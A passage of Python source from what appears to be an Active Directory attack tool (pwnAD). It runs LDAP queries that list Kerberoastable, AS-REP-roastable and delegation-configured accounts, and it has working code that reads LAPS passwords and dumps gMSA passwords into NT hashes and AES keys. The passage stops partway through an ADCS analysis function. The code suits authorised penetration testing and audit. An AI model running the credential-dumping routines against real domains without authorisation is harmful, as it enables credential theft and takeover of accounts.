from binascii import hexlify
from impacket.krb5 import constants
from impacket.krb5.crypto import string_to_key
from impacket.ldap import ldaptypes
from impacket.ldap.ldaptypes import ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, LDAP_SID, SR_SECURITY_DESCRIPTOR
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.protocol.formatters.formatters import format_sid
from ldap3.utils.conv import escape_filter_chars
from ldap3 import BASE, SUBTREE
from pyasn1.error import PyAsn1Error
import ldap3
import logging

from Cryptodome.Hash import MD4

from pwnAD.lib.accesscontrol import *
from pwnAD.lib.logger import BLUE, BOLD, LIGHT_RED, RESET
from pwnAD.lib.utils import format_list_results, check_error, resolve_target
from pwnAD.lib.gmsa import MSDS_MANAGEDPASSWORD_BLOB
from pwnAD.lib.adcs import (
    get_certificate_templates, get_enrollment_services, analyze_adcs,
    get_oid_to_group_links, ESC_DEFINITIONS, CertificateAuthority
)
from pwnAD.lib.permissions import writable_by_target
from pwnAD.commands.query import query


def users(conn):
    """List all user accounts in the domain."""
    query(conn, "(objectClass=user)", "samaccountname", simple=True)

def user(conn, account):
    """Get all attributes for a specific user account."""
    query(conn, f"(&(objectClass=*)(samaccountname={account}))", "*")

def computers(conn):
    """List all computer accounts in the domain."""
    query(conn, "(objectCategory=Computer)", "samaccountname", simple=True)

def DC(conn):
    """List all Domain Controllers with their SPNs."""
    query(conn, "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))", ["samaccountname", "serviceprincipalname"])

def servers(conn):
    """List all servers excluding Domain Controllers."""
    query(conn, "(&(objectCategory=computer)(operatingSystem=*server*)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))", "samaccountname", simple=True)

def CA(conn):
    """List all Certificate Authorities in the forest."""
    query(conn,
        search_base=f"CN=Enrollment Services,CN=Public Key Services,CN=Services,{conn.configuration_path}",
        search_filter="(&(objectClass=pKIEnrollmentService))",
        attributes=[
            "cn",
            "name",
            "dNSHostName",
            "cACertificateDN",
            "cACertificate",
            "certificateTemplates",
            "objectGUID",
        ],
    )

def OU(conn):
    """List all Organizational Units in the domain."""
    query(conn, "(objectCategory=organizationalUnit)", "distinguishedname", simple=True)

def containers(conn):
    """List all containers in the domain."""
    query(conn, "(objectCategory=container)", "distinguishedname", simple=True)

def spn(conn):
    """List all user accounts with Service Principal Names."""
    query(conn, "(&(objectClass=User)(serviceprincipalname=*)(samaccountname=*))", ["samaccountname", "serviceprincipalname"])

def constrained_delegation(conn):
    """List accounts configured for constrained delegation."""
    query(conn, "(&(objectClass=User)(msDS-AllowedToDelegateTo=*))", ["samaccountname", "serviceprincipalname", "msDS-AllowedToDelegateTo"])

def unconstrained_delegation(conn):
    """List accounts configured for unconstrained delegation."""
    query(conn, "(userAccountControl:1.2.840.113556.1.4.803:=524288)", ["samaccountname", "servicePrincipalName"])

def not_trusted_for_delegation(conn):
    """List accounts marked as NOT_DELEGATED."""
    query(conn, "(&(samaccountname=*)(userAccountControl:1.2.840.113556.1.4.803:=1048576))", "samaccountname", simple=True)

def asreproastables(conn):
    """List accounts vulnerable to AS-REP roasting (no Kerberos pre-auth required)."""
    query(conn, "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))", "samaccountname", simple=True)

def kerberoastables(conn):
    """List accounts vulnerable to Kerberoasting (user accounts with SPNs)."""
    query(conn, "(&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))", "samaccountname", simple=True)

def password_not_required(conn):
    """List accounts with PASSWORD_NOT_REQUIRED flag."""
    query(conn, "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))", "samaccountname", simple=True)

def groups(conn):
    """List all security and distribution groups."""
    query(conn, "(objectCategory=group)", "samaccountname", simple=True)

def protected_users(conn):
    """List members of Protected Users group."""
    query(conn, f"(&(objectCategory=CN=group,CN=Schema,CN=configuration,{conn._baseDN})(samaccountname=Protect*)(member=*))", "samaccountname", simple=True)

def users_description(conn):
    """List user descriptions (may contain passwords)."""
    query(conn, "(&(objectCategory=user)(description=*))", "description")

def passwords_dont_expire(conn):
    """List accounts with passwords set to never expire."""
    query(conn, "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))", "samaccountname", simple=True)

def users_with_admin_count(conn):
    """List users with adminCount=1 (historically privileged accounts)."""
    query(conn, "(&(objectClass=user)(admincount=1)(!(samaccountname=krbtgt)))", "samaccountname", simple=True)

def accounts_with_sid_history(conn):
    """List accounts with SID History attribute set."""
    query(conn, "(&(objectCategory=Person)(objectClass=User)(sidHistory=*))", "samaccountname", simple=True) 

def members(conn, group):
    """
    List all members of a group including primary group members.

    Args:
        conn: LDAP connection object
        group: sAMAccountName of the group
    """
    results = query(conn, f"(&(objectClass=group)(samaccountname={group}))", ["distinguishedName", "objectSid"], raw=True)
    if not results:
        logging.error(f"The group {group} doesn't exist")
        return

    group_dn = conn.get_dn_from_samaccountname(group, "*")
    primary_group_id = results[group_dn]['objectSid'].split("-")[-1]
    
    members = query(conn, f"(|(primaryGroupID={primary_group_id})(memberOf={group_dn}))", ["samaccountname"], simple=True, do_print=False)
    for member in members:
        if member == []:
            continue
        print(member)


def membership(conn, account, recurse=False):
    """
    Get group membership for an account.

    Args:
        conn: LDAP connection object
        account: sAMAccountName of the account
        recurse: If True, get nested group membership (max depth 5)
    """
    def get_recursive_groups(conn, account, max_depth, current_depth=1):
        nonlocal group_membership

        if current_depth > max_depth:
            return

        account_dn = conn.get_dn_from_samaccountname(account, "*")
        results = query(conn, f"(samaccountname={account})", ["memberOf", "primaryGroupID"], raw=True)
        account_data = results.get(account_dn)

        if 'memberOf' in account_data and account_data['memberOf']:
            for group_dn in account_data['memberOf']:
                sAMAccountName = conn.get_samaccountname_from_dn(group_dn, "*")
                if sAMAccountName not in group_membership:
                    group_membership.append(sAMAccountName)
                get_recursive_groups(conn, sAMAccountName, max_depth, current_depth + 1)

        if 'primaryGroupID' in account_data and account_data['primaryGroupID']:
            if isinstance(account_data['primaryGroupID'], list):
                for primary_group_id in account_data['primaryGroupID']:
                    sAMAccountName = conn.get_group_from_primary_group_id(primary_group_id, "*")
                    if sAMAccountName not in group_membership:
                        group_membership.append(sAMAccountName)
                    get_recursive_groups(conn, sAMAccountName, max_depth, current_depth + 1)
            else:
                primary_group_id = account_data['primaryGroupID']
                sAMAccountName = conn.get_group_from_primary_group_id(primary_group_id, "*")
                if sAMAccountName not in group_membership:
                    group_membership.append(sAMAccountName)
                get_recursive_groups(conn, sAMAccountName, max_depth, current_depth + 1)

    if not conn.exists(account):
        logging.error("This account doesn't exist")
    else:
        try:
            group_membership = []
            max_depth = 5 if recurse else 1
            get_recursive_groups(conn, account, max_depth)

        except Exception as e:
            logging.error(f"An error occured while trying to get membership : {e}")
            
        else:
            if group_membership != []:
                group_membership.sort()
                for group in group_membership:
                    print(group)
            else:
                logging.info(f"No group membership found for {account}")



def RBCD(conn):
    """List all accounts configured with Resource-Based Constrained Delegation."""
    rbcd_results = query(conn, "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)", "samaccountname", simple=True, do_print=False)
    for computer in rbcd_results:
        DN_delegate_to = conn.get_dn_from_samaccountname(samaccountname=computer, object_class="computer")

        conn.search(
                DN_delegate_to, 
                '(objectClass=*)', 
                search_scope=BASE,
                attributes=['SAMAccountName', 'objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity']
                )
        targetuser = None
        for entry in conn._ldap_connection.response:
            if entry['type'] != 'searchResEntry':
                continue
            targetuser = entry
        if not targetuser:
            logging.error('Could not query target user properties')
            return

        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetuser['raw_attributes']['msDS-AllowedToActOnBehalfOfOtherIdentity'][0])
            if len(sd['Dacl'].aces) > 0:
                sam = targetuser['attributes']['sAMAccountName']
                logging.info(f"Accounts allowed to act on behalf of other identity to {BLUE}{sam}{RESET}:")
                for ace in sd['Dacl'].aces:
                    sid = ace['Ace']['Sid'].formatCanonical()
                    sid_infos = conn.get_sid_info(sid)
                    if sid_infos:
                        sam_account_name = sid_infos[1]
                        logging.info(f'    {BLUE}{sam_account_name:<10}{RESET}   ({sid})')
            else:
                logging.info(f"Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty on {targetuser['attributes']['sAMAccountName']}")
        except IndexError:
            logging.info('Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty')


def owner(conn, target: str):
    """
    Get the owner of a target object from its security descriptor.

    Args:
        conn: LDAP connection object
        target: sAMAccountName of the target object
    """
    target_dn, _ = conn.ldap_get_user(target)
    controls = security_descriptor_control(sdflags=0x01)
    conn.search(search_base=conn._baseDN, search_filter=f'(distinguishedName={target_dn})', attributes=['nTSecurityDescriptor'], controls=controls)
    try:
        target_principal = conn._ldap_connection.entries[0]
        logging.debug(f'Target principal found in LDAP : {target}')
    except IndexError:
        logging.error(f'Target principal not found in LDAP : {target}')
        return
    
    target_principal_raw_security_descriptor = target_principal['nTSecurityDescriptor'].raw_values[0]
    target_principal_security_descriptor = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target_principal_raw_security_descriptor)

    current_owner_SID = format_sid(target_principal_security_descriptor['OwnerSid']).formatCanonical()
    logging.info("Current owner information below")
    logging.info(f"- SID: {current_owner_SID}")
    logging.info(f"- sAMAccountName: {conn.get_samaccountname_from_sid(current_owner_SID)}")
    conn._ldap_connection.search(conn._baseDN, '(objectSid=%s)' % current_owner_SID, attributes=['distinguishedName'])
    current_owner_distinguished_name = conn._ldap_connection.entries[0]
    logging.info(f"- distinguishedName: {current_owner_distinguished_name['distinguishedName']}")

def machine_quota(conn):
    """Get the machine account quota (number of computers a user can join to domain)."""
    conn.search(search_base=conn._baseDN, search_filter="(objectClass=*)", attributes=["ms-DS-MachineAccountQuota"])
    try:
        maq = conn._ldap_connection.entries[0]["ms-DS-MachineAccountQuota"]
        logging.info(f"MachineAccountQuota: {maq}")
    except PyAsn1Error:
        logging.error("MachineAccountQuota: <not set>")

def laps(conn):
    """Retrieve LAPS (Local Administrator Password Solution) passwords for computers.

    Supports both Legacy LAPS (ms-Mcs-AdmPwd) and Windows LAPS (msLAPS-Password,
    msLAPS-EncryptedPassword). Each version is queried separately to avoid schema
    errors on domains that only have one version deployed.
    """
    found_any = False

    laps_versions = [
        {
            'name': 'Legacy LAPS',
            'filter': '(&(objectCategory=computer)(ms-MCS-AdmPwd=*))',
            'attrs': ['sAMAccountName', 'ms-Mcs-AdmPwd'],
            'pwd_attr': 'ms-Mcs-AdmPwd',
        },
        {
            'name': 'Windows LAPS',
            'filter': '(&(objectCategory=computer)(|(msLAPS-Password=*)(msLAPS-EncryptedPassword=*)))',
            'attrs': ['sAMAccountName', 'msLAPS-Password', 'msLAPS-EncryptedPassword'],
            'pwd_attr': None,
        },
    ]

    for ver in laps_versions:
        try:
            conn.search(search_base=conn._baseDN, search_filter=ver['filter'], attributes=ver['attrs'])
            results = conn._ldap_connection.entries
            if results:
                found_any = True
                logging.info(f"{ver['name']} password(s) found:")
                for result in results:
                    sam = result['sAMAccountName']
                    if ver['pwd_attr']:
                        logging.info(f'  {sam} : {result[ver["pwd_attr"]]}')
                    else:
                        pwd = result.get('msLAPS-Password', None)
                        enc = result.get('msLAPS-EncryptedPassword', None)
                        pwd_val = pwd.value if pwd and pwd.value else None
                        enc_val = enc.value if enc and enc.value else None
                        if pwd_val:
                            logging.info(f'  {sam} : {pwd_val}')
                        elif enc_val:
                            logging.info(f'  {sam} : [encrypted] {enc_val}')
                        else:
                            logging.info(f'  {sam} : <present but empty>')
        except ldap3.core.exceptions.LDAPException as e:
            err_msg = str(e.args[0]) if e.args else str(e)
            if 'invalid attribute type' in err_msg:
                logging.debug(f"{ver['name']} schema not available on this domain")
            else:
                error_code = conn._ldap_connection.result['result']
                check_error(conn, error_code, e)

    if not found_any:
        logging.info("No LAPS passwords found (neither Legacy nor Windows LAPS)")

def gmsa(conn):
    """
    Retrieve Group Managed Service Account (gMSA) passwords and compute hashes.

    Note:
        Requires TLS connection for security. Displays NT hash and AES keys.
    """
    # code inspired from micahvandeusen's gMSADumper https://github.com/micahvandeusen/gMSADumper
    if conn._do_tls == False:
        logging.error("GMSA passwords can only be retrived through a secure connection.")
        choice = input("Do you want to start a TLS connection ? y/N")
        if choice.lower() == "y":
            try:
                conn.start_tls()
            except Exception as e:
                logging.error(f"An error occured while trying to start a TLS connection : {e}")
        else:
            return

    try :
        conn.search(
            search_base=conn._baseDN,
            search_filter='(&(ObjectClass=msDS-GroupManagedServiceAccount))',
            search_scope=SUBTREE,
            attributes=['sAMAccountName','msDS-ManagedPassword','msDS-GroupMSAMembership']
            )

        if len(conn._ldap_connection.entries) == 0:
            logging.info('No gMSAs returned.')

        for entry in conn._ldap_connection.entries:
            sam = entry['sAMAccountName'].value
            logging.info(f'Users or groups who can read password for {sam}:')
            for dacl in SR_SECURITY_DESCRIPTOR(data=entry['msDS-GroupMSAMembership'].raw_values[0])['Dacl']['Data']:
                conn.search(conn._baseDN, '(&(objectSID='+dacl['Ace']['Sid'].formatCanonical()+'))', attributes=['sAMAccountName'])

                # Added this check to prevent an error from occuring when there are no results returned
                if len(conn._ldap_connection.entries) != 0:
                    logging.info(conn._ldap_connection.entries[0]['sAMAccountName'].value)

            if 'msDS-ManagedPassword' in entry and entry['msDS-ManagedPassword']:
                data = entry['msDS-ManagedPassword'].raw_values[0]
                blob = MSDS_MANAGEDPASSWORD_BLOB()
                blob.fromString(data)
                currentPassword = blob['CurrentPassword'][:-2]

                # Compute ntlm key
                ntlm_hash = MD4.new ()
                ntlm_hash.update (currentPassword)
                passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                userpass = sam + ':::' + passwd
                logging.info(userpass)

                # Compute aes keys
                password = currentPassword.decode('utf-16-le', 'replace').encode('utf-8')
                salt = f'{conn.domain.upper()}host{sam[:-1].lower()}.{conn.domain.lower()}'
                aes_128_hash = hexlify(string_to_key(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, password, salt).contents)
                aes_256_hash = hexlify(string_to_key(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, password, salt).contents)
                logging.info(f'{sam}:aes256-cts-hmac-sha1-96:{aes_256_hash.decode("utf-8")}')
                logging.info(f'{sam}:aes128-cts-hmac-sha1-96:{aes_128_hash.decode("utf-8")}')

    except Exception as e:
        logging.error(f"An error occured while trying to retreive GMSA passwords : {e}")


def writable(conn, otype="*", right="ALL", detail=False, partition="DOMAIN", exclude_deleted=False):
    """
    Based on bloodyAD code.
    Retrieve objects writable by the current authenticated user.

    This function identifies directory objects that the current user can modify,
    using AD's computed attributes (allowedAttributesEffective, sDRightsEffective,
    allowedChildClassesEffective).

    Args:
        conn: LDAP connection object
        otype: Object class filter. Special keywords:
               - "useronly": Only user accounts (sAMAccountType=805306368)
               - "ou": Organizational Units and Containers
               - "gpo": Group Policy Objects
               - "*": All objects (default)
               - Or any valid objectClass name
        right: Type of right to search for:
               - "ALL": Search for all rights (WRITE + CHILD) (default)
               - "WRITE": Only objects where attributes can be written
               - "CHILD": Only objects where child objects can be created
        detail: If True, displays specific writable attributes and child classes
        partition: Directory partition to explore:
                   - "DOMAIN": Domain naming context (default)
                   - "CONFIGURATION": Configuration naming context
                   - "SCHEMA": Schema naming context
                   - "DNS": DNS application partitions (DomainDnsZones, ForestDnsZones)
                   - "ALL": All naming contexts including DNS zones
        exclude_deleted: If True, exclude deleted objects from results

    Returns:
        None (prints results to console)

    Example:
        writable(conn, otype="user", right="WRITE", detail=True)
        writable(conn, otype="ou", partition="ALL")
    """
    # Build LDAP filter based on object type
    if otype == "useronly":
        ldap_filter = f"(sAMAccountType={SAM_NORMAL_USER_ACCOUNT})"
    elif otype == "ou":
        ldap_filter = "(|(objectClass=container)(objectClass=organizationalUnit))"
    elif otype == "gpo":
        ldap_filter = "(objectClass=groupPolicyContainer)"
    else:
        ldap_filter = f"(objectClass={otype})"

    # Determine which attributes to retrieve
    attributes = ['distinguishedName']

    if right in ["WRITE", "ALL"]:
        attributes.extend(['allowedAttributesEffective', 'sDRightsEffective'])

    if right in ["CHILD", "ALL"]:
        attributes.append('allowedChildClassesEffective')

    # Determine search bases based on partition
    search_bases = []
    if partition == "DOMAIN":
        search_bases.append(conn._baseDN)
    elif partition == "CONFIGURATION":
        search_bases.append(conn.configuration_path)
    elif partition == "SCHEMA":
        search_bases.append(f"CN=Schema,{conn.configuration_path}")
    elif partition == "DNS":
        # DNS application partitions
        search_bases.extend([
            f"DC=DomainDnsZones,{conn._baseDN}",
            f"DC=ForestDnsZones,{conn._baseDN}"
        ])
    elif partition == "ALL":
        search_bases.extend([
            conn._baseDN,
            conn.configuration_path,
            f"CN=Schema,{conn.configuration_path}",
            f"DC=DomainDnsZones,{conn._baseDN}",
            f"DC=ForestDnsZones,{conn._baseDN}"
        ])

    # Set up LDAP controls
    controls = []
    if not exclude_deleted:
        # Include deleted objects (tombstones) by setting the LDAP_SERVER_SHOW_DELETED_OID control
        from ldap3.protocol.microsoft import extended_dn_control
        try:
            # Show deleted objects control
            show_deleted_control = ('1.2.840.113556.1.4.417', True, None)
            controls.append(show_deleted_control)
        except Exception:
            pass

    # Helper function to interpret sDRightsEffective
    def parse_sd_rights(sd_rights_value):
        """
        Parse sDRightsEffective value to determine SD modification rights.

        Bit flags:
        - 0x01: OWNER (can modify owner)
        - 0x04: DACL (can modify DACL)
        - 0x08: SACL (can modify SACL)
        """
        rights = {}
        if not sd_rights_value:
            return rights

        try:
            value = int(sd_rights_value)
            if value & 0x01:
                rights["OWNER"] = "WRITE"
            if value & 0x04:
                rights["DACL"] = "WRITE"
            if value & 0x08:
                rights["SACL"] = "WRITE"
        except (ValueError, TypeError):
            pass

        return rights

    # Search for writable objects
    writable_objects_count = 0

    for search_base in search_bases:
        try:
            logging.info(f"Searching for writable objects in {search_base}...")

            conn.search(
                search_base=search_base,
                search_filter=ldap_filter,
                search_scope=SUBTREE,
                attributes=attributes,
                controls=controls if controls else None
            )

            entries = conn._ldap_connection.entries

            for entry in entries:
                has_write_permission = False
                permissions = []
                sd_rights_info = {}
                detail_info = []

                # Check for attribute write permissions
                if right in ["WRITE", "ALL"]:
                    if 'allowedAttributesEffective' in entry:
                        allowed_attrs = entry['allowedAttributesEffective'].value
                        if allowed_attrs:
                            has_write_permission = True
                            permissions.append("WRITE")
                            if detail:
                                if isinstance(allowed_attrs, list):
                                    detail_info.append(f"Writable attributes ({len(allowed_attrs)}): {', '.join(allowed_attrs[:5])}" +
                                                      (" ..." if len(allowed_attrs) > 5 else ""))
                                else:
                                    detail_info.append(f"Writable attributes: {allowed_attrs}")

                    # Check for Security Descriptor write permissions
                    if 'sDRightsEffective' in entry:
                        sd_rights = entry['sDRightsEffective'].value
                        if sd_rights:
                            sd_rights_info = parse_sd_rights(sd_rights)
                            if sd_rights_info:
                                has_write_permission = True

                # Check for child creation permissions
                if right in ["CHILD", "ALL"]:
                    if 'allowedChildClassesEffective' in entry:
                        allowed_child_classes = entry['allowedChildClassesEffective'].value
                        if allowed_child_classes:
                            has_write_permission = True
                            permissions.append("CREATE_CHILD")
                            if detail:
                                if isinstance(allowed_child_classes, list):
                                    detail_info.append(f"Creatable child classes ({len(allowed_child_classes)}): {', '.join(allowed_child_classes[:5])}" +
                                                      (" ..." if len(allowed_child_classes) > 5 else ""))
                                else:
                                    detail_info.append(f"Creatable child classes: {allowed_child_classes}")

                # Display if object has write permissions
                if has_write_permission:
                    writable_objects_count += 1
                    dn = entry.distinguishedName.value if hasattr(entry.distinguishedName, 'value') else str(entry.distinguishedName)

                    print(f"\ndistinguishedName: {dn}")
                    if permissions:
                        print(f"permission: {'; '.join(permissions)}")
                    for sd_type, sd_perm in sd_rights_info.items():
                        print(f"{sd_type}: {sd_perm}")
                    if detail:
                        for info in detail_info:
                            print(f"  {info}")

        except ldap3.core.exceptions.LDAPException as e:
            logging.error(f"Error searching {search_base}: {e}")
        except Exception as e:
            logging.error(f"Unexpected error searching {search_base}: {e}")

    # Summary
    if writable_objects_count == 0:
        logging.info("No writable objects found")
    else:
        logging.info(f"Total writable objects found: {writable_objects_count}")


def object(conn, target: str, attr: str = "*", resolve_sd: bool = False, raw: bool = False):
    """
    Retrieve attributes of any LDAP object.

    This function provides generic access to any AD object's attributes,
    supporting multiple target identification formats (sAMAccountName, DN, SID).

    Args:
        conn: LDAP connection object
        target: Target identifier (sAMAccountName, DN, or SID)
        attr: Comma-separated list of attributes to retrieve (default: "*" for all)
        resolve_sd: If True, resolve security descriptors to SDDL format (default: False)
        raw: If True, display raw values without formatting (default: False)

    Example:
        get object Administrator
        get object Administrator --attr sAMAccountName,memberOf
        get object S-1-5-21-xxx-500
        get object "CN=Admin,CN=Users,DC=corp,DC=local" --resolve-sd
    """
    # Resolve target to DN
    target_dn = resolve_target(conn, target)
    if not target_dn:
        return

    # Parse attributes
    if attr == "*":
        attributes = ["*"]
    else:
        attributes = [a.strip() for a in attr.split(",")]

    # Add nTSecurityDescriptor if resolve_sd is requested
    if resolve_sd and "nTSecurityDescriptor" not in attributes and "*" not in attributes:
        attributes.append("nTSecurityDescriptor")

    # Set up controls for security descriptor retrieval
    controls = None
    if resolve_sd:
        controls = security_descriptor_control(sdflags=0x07)  # Owner + Group + DACL

    try:
        conn._ldap_connection.search(
            search_base=target_dn,
            search_filter="(objectClass=*)",
            search_scope=BASE,
            attributes=attributes,
            controls=controls
        )

        if not conn._ldap_connection.entries:
            logging.error(f"Object not found: {target}")
            return

        entry = conn._ldap_connection.entries[0]

        # Display results
        print(f"\n{entry.entry_dn}")
        print("-" * len(entry.entry_dn))

        for attr_name in sorted(entry.entry_attributes):
            attr_value = entry[attr_name]

            # Handle security descriptor resolution
            if resolve_sd and attr_name.lower() == "ntsecuritydescriptor":
                try:
                    raw_sd = attr_value.raw_values[0]
                    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw_sd)

                    # Display owner
                    if sd['OwnerSid']:
                        owner_sid = format_sid(sd['OwnerSid']).formatCanonical()
                        owner_name = conn.get_samaccountname_from_sid(owner_sid)
                        print(f"  Owner: {owner_name} ({owner_sid})")

                    # Display group
                    if sd['GroupSid']:
                        group_sid = format_sid(sd['GroupSid']).formatCanonical()
                        group_name = conn.get_samaccountname_from_sid(group_sid)
                        print(f"  Group: {group_name} ({group_sid})")

                    # Display DACL ACE count
                    if sd['Dacl']:
                        print(f"  DACL ACEs: {len(sd['Dacl'].aces)}")
                    continue
                except Exception as e:
                    logging.debug(f"Failed to parse security descriptor: {e}")

            # Handle raw values
            if raw:
                if hasattr(attr_value, 'raw_values'):
                    values = attr_value.raw_values
                else:
                    values = [attr_value.value]
            else:
                if hasattr(attr_value, 'values'):
                    values = attr_value.values if attr_value.values else [attr_value.value]
                else:
                    values = [attr_value.value]

            # Format output
            if values is None:
                continue
            elif isinstance(values, list):
                if len(values) == 0:
                    continue
                elif len(values) == 1:
                    print(f"  {attr_name}: {values[0]}")
                else:
                    print(f"  {attr_name}:")
                    for v in values:
                        print(f"    {v}")
            else:
                print(f"  {attr_name}: {values}")

        print()

    except ldap3.core.exceptions.LDAPException as e:
        logging.error(f"LDAP error: {e}")
    except Exception as e:
        logging.error(f"Error retrieving object: {e}")


def attribute(conn, target: str, attr: str, raw: bool = False):
    """
    Retrieve a specific attribute value from any LDAP object.

    This function provides a simple way to get one or more attribute values
    from an AD object, supporting multiple target identification formats.

    Args:
        conn: LDAP connection object
        target: Target identifier (sAMAccountName, DN, or SID)
        attr: Comma-separated list of attributes to retrieve
        raw: If True, display raw values without formatting (default: False)

    Example:
        get attribute Administrator description
        get attribute user1 memberOf,primaryGroupID
        get attribute DC01$ servicePrincipalName
    """
    # Resolve target to DN
    target_dn = resolve_target(conn, target)
    if not target_dn:
        return

    # Parse attributes
    attributes = [a.strip() for a in attr.split(",")]

    try:
        conn._ldap_connection.search(
            search_base=target_dn,
            search_filter="(objectClass=*)",
            search_scope=BASE,
            attributes=attributes
        )

        if not conn._ldap_connection.entries:
            logging.error(f"Object not found: {target}")
            return

        entry = conn._ldap_connection.entries[0]

        # Display results
        for attr_name in attributes:
            if attr_name not in entry.entry_attributes:
                logging.info(f"{attr_name}: <not set>")
                continue

            attr_value = entry[attr_name]

            # Handle raw values
            if raw:
                if hasattr(attr_value, 'raw_values'):
                    values = attr_value.raw_values
                else:
                    values = [attr_value.value]
            else:
                if hasattr(attr_value, 'values'):
                    values = attr_value.values if attr_value.values else [attr_value.value]
                else:
                    values = [attr_value.value]

            # Format output
            if values is None:
                logging.info(f"{attr_name}: <not set>")
            elif isinstance(values, list):
                if len(values) == 0:
                    logging.info(f"{attr_name}: <empty>")
                elif len(values) == 1:
                    print(f"{attr_name}: {values[0]}")
                else:
                    print(f"{attr_name}:")
                    for v in values:
                        print(f"  {v}")
            else:
                print(f"{attr_name}: {values}")

    except ldap3.core.exceptions.LDAPException as e:
        logging.error(f"LDAP error: {e}")
    except Exception as e:
        logging.error(f"Error retrieving attribute: {e}")


def deleted(conn, target: str = None, otype: str = "*"):
    """
    List deleted objects from the AD Recycle Bin.

    This function enumerates objects in the CN=Deleted Objects container
    using the LDAP_SERVER_SHOW_DELETED_OID control (1.2.840.113556.1.4.417).

    Args:
        conn: LDAP connection object
        target: Optional target to search for (sAMAccountName, SID, or name pattern)
        otype: Object type filter (user, computer, group, or * for all)

    Note:
        Requires the AD Recycle Bin feature to be enabled (Windows Server 2008 R2+).
        Deleted objects retain their attributes for the tombstoneLifetime period (default 180 days).
    """
    # LDAP control to show deleted objects
    LDAP_SERVER_SHOW_DELETED_OID = "1.2.840.113556.1.4.417"
    show_deleted_control = (LDAP_SERVER_SHOW_DELETED_OID, True, None)

    # Build search filter
    if otype == "user":
        type_filter = "(objectClass=user)"
    elif otype == "computer":
        type_filter = "(objectClass=computer)"
    elif otype == "group":
        type_filter = "(objectClass=group)"
    else:
        type_filter = "(objectClass=*)"

    # Base filter for deleted objects
    if target:
        # Search by sAMAccountName, SID, or name pattern
        escaped_target = escape_filter_chars(target)
        if target.startswith("S-1-"):
            ldap_filter = f"(&(isDeleted=TRUE){type_filter}(objectSid={escaped_target}))"
        else:
            ldap_filter = f"(&(isDeleted=TRUE){type_filter}(|(sAMAccountName=*{escaped_target}*)(cn=*{escaped_target}*)(name=*{escaped_target}*)))"
    else:
        ldap_filter = f"(&(isDeleted=TRUE){type_filter})"

    # Search in Deleted Objects container
    deleted_objects_dn = f"CN=Deleted Objects,{conn._baseDN}"

    attributes = [
        'distinguishedName',
        'sAMAccountName',
        'objectSid',
        'objectClass',
        'name',
        'msDS-LastKnownRDN',
        'lastKnownParent',
        'whenChanged',
        'whenCreated',
        'isDeleted'
    ]

    try:
        conn._ldap_connection.search(
            search_base=deleted_objects_dn,
            search_filter=ldap_filter,
            search_scope=ldap3.SUBTREE,
            attributes=attributes,
            controls=[show_deleted_control]
        )

        entries = conn._ldap_connection.entries

        if not entries:
            logging.info("No deleted objects found")
            return

        logging.info(f"Found {len(entries)} deleted object(s)")
        print()

        for entry in entries:
            dn = entry.entry_dn
            attrs = entry.entry_attributes_as_dict

            # Get object class for display
            obj_classes = attrs.get('objectClass', [])
            if 'computer' in obj_classes:
                obj_type = 'Computer'
            elif 'group' in obj_classes:
                obj_type = 'Group'
            elif 'user' in obj_classes:
                obj_type = 'User'
            else:
                obj_type = 'Object'

            sam = attrs.get('sAMAccountName', [''])[0] if attrs.get('sAMAccountName') else ''
            name = attrs.get('name', [''])[0] if attrs.get('name') else ''
            last_known_rdn = attrs.get('msDS-LastKnownRDN', [''])[0] if attrs.get('msDS-LastKnownRDN') else ''
            last_known_parent = attrs.get('lastKnownParent', [''])[0] if attrs.get('lastKnownParent') else ''
            object_sid = attrs.get('objectSid', [''])[0] if attrs.get('objectSid') else ''
            when_changed = attrs.get('whenChanged', [''])[0] if attrs.get('whenChanged') else ''

            print(f"{LIGHT_RED}[DELETED]{RESET} {BOLD}{last_known_rdn or name}{RESET} ({obj_type})")
            if sam:
                print(f"  sAMAccountName: {sam}")
            if object_sid:
                print(f"  objectSid: {object_sid}")
            if last_known_parent:
                print(f"  lastKnownParent: {last_known_parent}")
            if when_changed:
                print(f"  whenChanged: {when_changed}")
            print(f"  distinguishedName: {dn}")
            print()

    except ldap3.core.exceptions.LDAPException as e:
        if "noSuchObject" in str(e):
            logging.error("Deleted Objects container not found. AD Recycle Bin may not be enabled.")
        else:
            logging.error(f"LDAP error: {e}")
    except Exception as e:
        logging.error(f"Error listing deleted objects: {e}")


def adcs(conn, vulnerable_only: bool = False, output: str = None, format: str = "text", stdout: bool = False, ca_config: bool = False):
    """
    Perform full ADCS enumeration and vulnerability analysis.

    Similar to 'certipy find' - enumerates CAs, templates, and detects ESC1-ESC15.

    Args:
        conn: LDAP connection object
        vulnerable_only: If True, only show vulnerable templates
        output: Output file path (base name for CSV)
        format: Output format - 'text', 'json', or 'csv'
        stdout: Force output to stdout even with --output
        ca_config: If True, try to get CA config via RRP (Web Enrollment, User Specified SAN, etc.)
    """
    import json
    import csv
    import io
    from datetime import datetime

    logging.info("Performing ADCS enumeration...")

    try:
        # Full analysis
        result = analyze_adcs(conn, vulnerable_only=vulnerable_only, get_ca_config=ca_config)

        cas = result['cas']
        all_templates = result['templates']
        summary = result['summary']

        # Determine output destination
        write_to_file = output and not stdout
        write_to_stdout = not output or stdout

        # JSON output
        if format == "json":
            output_data = {
                'domain': conn.domain,
                'timestamp': datetime.now().isoformat(),
                'cas': [ca.to_dict() for ca in cas],
                'templates': [t.to_dict() for t in all_templates],
                'summary': summary,
            }
